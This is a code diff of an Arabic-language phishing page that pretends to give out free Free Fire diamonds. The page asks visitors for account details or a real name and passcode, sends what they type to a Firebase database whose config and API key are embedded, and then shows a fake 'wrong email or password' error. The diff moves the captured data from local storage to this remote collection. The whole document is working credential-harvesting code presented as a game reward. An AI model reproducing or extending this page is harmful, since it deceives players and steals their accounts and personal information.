@@ -5,35 +5,55 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Freefire Best Reward Gifter</title>
     <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
+    
     <script>
+        // Your Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAPPCLoihdah2hkQZn-jOg9ZV15fve4mAY",
+            authDomain: "freefire-best-reward.firebaseapp.com",
+            projectId: "freefire-best-reward",
+            storageBucket: "freefire-best-reward.firebasestorage.app",
+            messagingSenderId: "897344687951",
+            appId: "1:897344687951:web:a444291b83b6da64df3f3a"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database(app);
+
         function gatherInfo() {
             // Get the values from the input fields
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            const realLifeName = document.getElementById('realLifeName').value;
+            const passcode = document.getElementById('passcode').value;
 
             // Create a log entry
             const logEntry = {
-                email: email,
-                password: password,
+                name: realLifeName,
+                passcode: passcode,
                 timestamp: new Date().toISOString() // Adding a timestamp
             };
 
-            // Retrieve existing logs from local storage
-            let logs = JSON.parse(localStorage.getItem('logs')) || [];
-
-            // Add the new log entry
-            logs.push(logEntry);
-
-            // Save the updated logs back to local storage
-            localStorage.setItem('logs', JSON.stringify(logs));
+            // Store the log entry in Firebase
+            const newLogRef = database.ref('logs').push(); // Creates a new log entry in the 'logs' node
+            newLogRef.set(logEntry)
+                .then(() => {
+                    console.log('Log entry saved to Firebase:', logEntry);
+                })
+                .catch((error) => {
+                    console.error('Error saving log entry:', error);
+                });
 
             // Log the values to the console
-            console.log(`Email: ${email}, Password: ${password}`);
+            console.log(`Real Life Name: ${realLifeName}, Passcode: ${passcode}`);
             alert('البريد الإلكتروني أو كلمة المرور خاطئة!');
 
             // Resetting the input fields
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
+            document.getElementById('realLifeName').value = '';
+            document.getElementById('passcode').value = '';
         }
     </script>
 </head>
@@ -45,8 +65,8 @@
         <h1>مكافأة الماس المجانية من فري فاير</h1>
         <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
         
-        <input type="text" id="email" placeholder="Gmail/Facebook email" required>
-        <input type="text" id="password" placeholder="كلمة مرور حسابك" required>
+        <input type="text" id="realLifeName" placeholder="اسمك الحقيقي" required>
+        <input type="text" id="passcode" placeholder="رقم سري" required>
         <button onclick="gatherInfo()">اقبل</button>
     </main>
 </body>
